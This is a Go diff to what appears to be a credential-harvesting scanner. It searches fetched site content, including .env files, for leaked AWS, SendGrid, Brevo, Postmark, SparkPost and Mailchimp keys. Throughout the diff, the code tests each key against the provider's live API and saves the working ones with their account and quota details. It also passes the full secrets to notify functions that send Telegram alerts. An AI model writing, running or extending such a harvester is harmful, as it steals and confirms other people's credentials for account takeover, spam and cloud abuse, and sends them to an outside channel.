@@ -83,6 +83,10 @@ var (
 	awsKeywordsRegex  *regexp.Regexp
 	sendgridKwRegex   *regexp.Regexp
 	brevoKwRegex      *regexp.Regexp
+	postmarkTokenRe   *regexp.Regexp
+	sparkpostKeyRe    *regexp.Regexp
+	mailchimpKeyRe    *regexp.Regexp
+	genericSMTPHostRe *regexp.Regexp
 
 	httpClient *http.Client
 
@@ -122,6 +126,11 @@ func init() {
 	sendgridKwRegex = regexp.MustCompile(`(?i)\b(sendgrid|smtp\.sendgrid\.net)\b`)
 	brevoKwRegex = regexp.MustCompile(`(?i)\b(brevo|sendinblue|smtp-relay\.brevo\.com|smtp-relay\.sendinblue\.com)\b`)
 
+	postmarkTokenRe = regexp.MustCompile(`(?i)POSTMARK(?:_SERVER)?_TOKEN\s*[=:]\s*['\"]?([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})`)
+	sparkpostKeyRe = regexp.MustCompile(`(?i)SPARKPOST(?:_API)?_KEY\s*[=:]\s*['\"]?([^\s'\"]+)`)
+	mailchimpKeyRe = regexp.MustCompile(`(?i)MAILCHIMP(?:_API)?_KEY\s*[=:]\s*['\"]?([0-9a-f]{32}-us[0-9]{1,3})`)
+	genericSMTPHostRe = regexp.MustCompile(`(?i)\b(?:smtp|mail|email|relay)\.[a-z0-9](?:[a-z0-9.-]*[a-z0-9])?\.(?:[a-z]{2,}|xn--[a-z0-9-]+)\b`)
+
 	apiServices = []ApiService{
 		// Brevo / SendGrid / Twilio: traités par check* + save* pour *_full.txt
 		{Pattern: regexp.MustCompile(`sk_live_[0-9a-zA-Z]{24,}`), Name: "Stripe", ResultFile: "results/stripe.txt"},
@@ -134,6 +143,10 @@ func init() {
 		{Pattern: awsKeywordsRegex, Name: "AWS keywords", ResultFile: "results/aws_keywords.txt"},
 		{Pattern: sendgridKwRegex, Name: "SendGrid keywords", ResultFile: "results/sendgrid_keywords.txt"},
 		{Pattern: brevoKwRegex, Name: "Brevo keywords", ResultFile: "results/brevo_keywords.txt"},
+		{Pattern: regexp.MustCompile(`api\.postmarkapp\.com|POSTMARK`), Name: "Postmark", ResultFile: "results/postmark.txt"},
+		{Pattern: regexp.MustCompile(`(?i)sparkpost\.com|SPARKPOST`), Name: "SparkPost", ResultFile: "results/sparkpost.txt"},
+		{Pattern: regexp.MustCompile(`(?i)mailchimp\.com|mandrillapp\.com`), Name: "Mailchimp/Mandrill", ResultFile: "results/mailchimp.txt"},
+		{Pattern: genericSMTPHostRe, Name: "SMTP host (generic)", ResultFile: "results/smtp_hosts.txt"},
 	}
 
 	transport := &http.Transport{
@@ -392,27 +405,46 @@ func printLogo() {
 	fmt.Printf("==========================================%s\n", Reset)
 }
 
+func truncateStr(s string, n int) string {
+	if len(s) <= n {
+		return s
+	}
+	return s[:n] + "…"
+}
+
 func saveCredentials(accessKeyId, secretAccessKey, source string, content string) {
+	ok, region, arn, account, userID, errDetail := validateAWS(accessKeyId, secretAccessKey)
+	if !ok {
+		fmt.Printf("[-] %sAWS rejeté (STS): %s%s\n", Yellow, truncateStr(errDetail, 200), Reset)
+		return
+	}
 	contextContent := extractContext(content,
 		strings.Index(content, accessKeyId), CONTEXT_LINES)
-	saveContent := fmt.Sprintf("Source: %s\n%s\n\n", source, contextContent)
+	saveContent := fmt.Sprintf("Source: %s\nVALID region=%s\nARN=%s\nAccount=%s\n%s\n\n",
+		source, region, arn, account, contextContent)
 	queueResult("results/aws_full.txt", saveContent)
 	if !strings.Contains(source, "/.env") {
-		historyContent := fmt.Sprintf("Site: %s | Service: AWS\nContexte:\n%s\n\n---\n\n",
+		historyContent := fmt.Sprintf("Site: %s | Service: AWS (valid)\nContexte:\n%s\n\n---\n\n",
 			source, contextContent)
 		queueResult("results/history.txt", historyContent)
 	}
 	atomic.AddInt64(&stats.totalFound, 1)
-	fmt.Printf("[+] %sAWS Credentials: %s%s\n", Green, accessKeyId, Reset)
+	fmt.Printf("[+] %sAWS VALIDÉ (%s): %s%s\n", Green, region, accessKeyId, Reset)
+	notifyAWSValid(source, accessKeyId, secretAccessKey, region, arn, account, userID, strings.Join(awsSTSCandidateRegions, ", "))
 }
 
 func saveSendgridCredentials(apiKey, source string, content string) {
+	ok, quota, raw := validateSendGrid(apiKey)
+	if !ok {
+		fmt.Printf("[-] %sSendGrid rejeté (API): %s%s\n", Yellow, truncateStr(raw, 120), Reset)
+		return
+	}
 	contextContent := extractContext(content, strings.Index(content, apiKey), CONTEXT_LINES)
-	saveContent := fmt.Sprintf("Source: %s\n%s\n\n", source, contextContent)
+	saveContent := fmt.Sprintf("Source: %s\nQUOTA: %s\n%s\n\n%s\n\n", source, quota, contextContent, raw)
 	queueResult("results/sendgrid_full.txt", saveContent)
 	queueResult("results/sendgrid.txt", saveContent)
 	if !strings.Contains(source, "/.env") {
-		historyContent := fmt.Sprintf("Site: %s | Service: SendGrid\nContexte:\n%s\n\n---\n\n",
+		historyContent := fmt.Sprintf("Site: %s | Service: SendGrid (valid)\nContexte:\n%s\n\n---\n\n",
 			source, contextContent)
 		queueResult("results/history.txt", historyContent)
 	}
@@ -421,16 +453,22 @@ func saveSendgridCredentials(apiKey, source string, content string) {
 	if len(apiKey) > 8 {
 		displayKey = apiKey[:8] + "..."
 	}
-	fmt.Printf("[+] %sSendgrid: %s%s\n", Green, displayKey, Reset)
+	fmt.Printf("[+] %sSendGrid VALIDÉ: %s | %s%s\n", Green, displayKey, quota, Reset)
+	notifySendGridValid(source, apiKey, quota, raw)
 }
 
 func saveBrevoCredentials(apiKey, source string, content string) {
+	ok, quota, raw := validateBrevo(apiKey)
+	if !ok {
+		fmt.Printf("[-] %sBrevo rejeté (API): %s%s\n", Yellow, truncateStr(raw, 120), Reset)
+		return
+	}
 	contextContent := extractContext(content, strings.Index(content, apiKey), CONTEXT_LINES)
-	saveContent := fmt.Sprintf("Source: %s\n%s\n\n", source, contextContent)
+	saveContent := fmt.Sprintf("Source: %s\n%s\n\nQUOTA: %s\n\n%s\n\n", source, contextContent, quota, raw)
 	queueResult("results/brevo_full.txt", saveContent)
 	queueResult("results/brevo.txt", saveContent)
 	if !strings.Contains(source, "/.env") {
-		historyContent := fmt.Sprintf("Site: %s | Service: Brevo\nContexte:\n%s\n\n---\n\n",
+		historyContent := fmt.Sprintf("Site: %s | Service: Brevo (valid)\nContexte:\n%s\n\n---\n\n",
 			source, contextContent)
 		queueResult("results/history.txt", historyContent)
 	}
@@ -439,7 +477,8 @@ func saveBrevoCredentials(apiKey, source string, content string) {
 	if len(apiKey) > 8 {
 		displayKey = apiKey[:8] + "..."
 	}
-	fmt.Printf("[+] %sBrevo: %s%s\n", Green, displayKey, Reset)
+	fmt.Printf("[+] %sBrevo VALIDÉ: %s | %s%s\n", Green, displayKey, quota, Reset)
+	notifyBrevoValid(source, apiKey, quota, raw)
 }
 
 func saveTwilioCredentials(accountSid, source string, content string) {
@@ -455,29 +494,98 @@ func saveTwilioCredentials(accountSid, source string, content string) {
 	fmt.Printf("[+] %sTwilio: %s%s\n", Green, accountSid, Reset)
 }
 
+func checkTwilioCredentials(bodyStr, source string) {
+	if twilioAccounts := twilioRegex.FindAllString(bodyStr, -1); len(twilioAccounts) > 0 {
+		for _, accountSid := range twilioAccounts {
+			saveTwilioCredentials(accountSid, source, bodyStr)
+		}
+	}
+}
+
 func checkSendgridCredentials(bodyStr, source string) {
+	seen := make(map[string]struct{})
 	if sendgridKey := sendgridRegex1.FindStringSubmatch(bodyStr); len(sendgridKey) > 1 {
-		saveSendgridCredentials(sendgridKey[1], source, bodyStr)
+		k := sendgridKey[1]
+		if _, ok := seen[k]; !ok {
+			seen[k] = struct{}{}
+			saveSendgridCredentials(k, source, bodyStr)
+		}
 	}
 	if sendgridKeys := sendgridRegex2.FindAllString(bodyStr, -1); len(sendgridKeys) > 0 {
 		for _, key := range sendgridKeys {
+			if _, ok := seen[key]; ok {
+				continue
+			}
+			seen[key] = struct{}{}
 			saveSendgridCredentials(key, source, bodyStr)
 		}
 	}
 }
 
 func checkBrevoCredentials(bodyStr, source string) {
+	seen := make(map[string]struct{})
 	if brevoKeys := brevoRegex.FindAllString(bodyStr, -1); len(brevoKeys) > 0 {
 		for _, key := range brevoKeys {
+			if _, ok := seen[key]; ok {
+				continue
+			}
+			seen[key] = struct{}{}
 			saveBrevoCredentials(key, source, bodyStr)
 		}
 	}
 }
 
-func checkTwilioCredentials(bodyStr, source string) {
-	if twilioAccounts := twilioRegex.FindAllString(bodyStr, -1); len(twilioAccounts) > 0 {
-		for _, accountSid := range twilioAccounts {
-			saveTwilioCredentials(accountSid, source, bodyStr)
+func checkPostmarkSparkPostMailchimp(bodyStr, source string) {
+	seen := make(map[string]struct{})
+	for _, m := range postmarkTokenRe.FindAllStringSubmatch(bodyStr, -1) {
+		if len(m) < 2 {
+			continue
+		}
+		tok := m[1]
+		if _, ok := seen["pm:"+tok]; ok {
+			continue
+		}
+		seen["pm:"+tok] = struct{}{}
+		if ok, detail := validatePostmark(tok); ok {
+			ctx := extractContext(bodyStr, strings.Index(bodyStr, tok), CONTEXT_LINES)
+			queueResult("results/postmark_valid.txt", fmt.Sprintf("Source: %s\nToken: %s\n%s\n\n%s\n\n", source, tok, detail, ctx))
+			atomic.AddInt64(&stats.totalFound, 1)
+			fmt.Printf("[+] %sPostmark VALIDÉ%s\n", Green, Reset)
+			notifyProviderValid("Postmark", source, tok, detail)
+		}
+	}
+	for _, m := range sparkpostKeyRe.FindAllStringSubmatch(bodyStr, -1) {
+		if len(m) < 2 {
+			continue
+		}
+		key := m[1]
+		if _, ok := seen["sp:"+key]; ok {
+			continue
+		}
+		seen["sp:"+key] = struct{}{}
+		if ok, detail := validateSparkPost(key); ok {
+			ctx := extractContext(bodyStr, strings.Index(bodyStr, key), CONTEXT_LINES)
+			queueResult("results/sparkpost_valid.txt", fmt.Sprintf("Source: %s\nKey: %s\n%s\n\n%s\n\n", source, key, detail, ctx))
+			atomic.AddInt64(&stats.totalFound, 1)
+			fmt.Printf("[+] %sSparkPost VALIDÉ%s\n", Green, Reset)
+			notifyProviderValid("SparkPost", source, key, detail)
+		}
+	}
+	for _, m := range mailchimpKeyRe.FindAllStringSubmatch(bodyStr, -1) {
+		if len(m) < 2 {
+			continue
+		}
+		key := m[1]
+		if _, ok := seen["mc:"+key]; ok {
+			continue
+		}
+		seen["mc:"+key] = struct{}{}
+		if ok, detail := validateMailchimp(key); ok {
+			ctx := extractContext(bodyStr, strings.Index(bodyStr, key), CONTEXT_LINES)
+			queueResult("results/mailchimp_valid.txt", fmt.Sprintf("Source: %s\nKey: %s\n%s\n\n%s\n\n", source, key, detail, ctx))
+			atomic.AddInt64(&stats.totalFound, 1)
+			fmt.Printf("[+] %sMailchimp VALIDÉ%s\n", Green, Reset)
+			notifyProviderValid("Mailchimp", source, key, detail)
 		}
 	}
 }
@@ -548,6 +656,7 @@ func processBody(bodyBytes []byte, source string) {
 
 	checkSendgridCredentials(bodyStr, source)
 	checkBrevoCredentials(bodyStr, source)
+	checkPostmarkSparkPostMailchimp(bodyStr, source)
 	checkTwilioCredentials(bodyStr, source)
 
 	for _, service := range apiServices {
@@ -772,6 +881,10 @@ func main() {
 	}
 
 	printLogo()
+	loadTelegramFromEnv()
+	if !telegramReady {
+		fmt.Printf("%s[!] Telegram désactivé: export TELEGRAM_BOT_TOKEN et TELEGRAM_CHAT_ID pour les alertes%s\n", Yellow, Reset)
+	}
 	if err := os.MkdirAll("results", 0755); err != nil {
 		fmt.Printf("[-] %sresults/: %v%s\n", Red, err, Reset)
 		os.Exit(1)
